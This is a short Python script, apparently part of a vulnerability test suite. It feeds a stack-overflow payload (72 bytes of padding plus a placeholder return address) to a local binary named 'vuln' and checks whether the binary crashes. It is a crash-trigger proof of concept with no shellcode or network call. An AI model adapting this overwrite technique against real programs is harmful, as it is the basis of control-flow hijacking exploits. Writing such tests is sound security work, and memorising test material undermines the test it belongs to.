#!/usr/bin/env python3
"""Tier-1 stack-overflow / C++ — trigger via stdin payload."""
import os
import subprocess
import sys

PADDING = 64 + 8           # buf + saved RBP
RIP_PATTERN = b"BBBBBBBB"


def main() -> int:
    binary = sys.argv[1] if len(sys.argv) > 1 else os.path.join("build", "vuln")
    payload = b"A" * PADDING + RIP_PATTERN + b"\n"
    proc = subprocess.run([binary], input=payload, capture_output=True, timeout=5)
    crashed = proc.returncode < 0 or proc.returncode in (134, 139)
    print(f"returncode={proc.returncode} crashed={crashed}")
    return 0 if crashed else 1


if __name__ == "__main__":
    sys.exit(main())
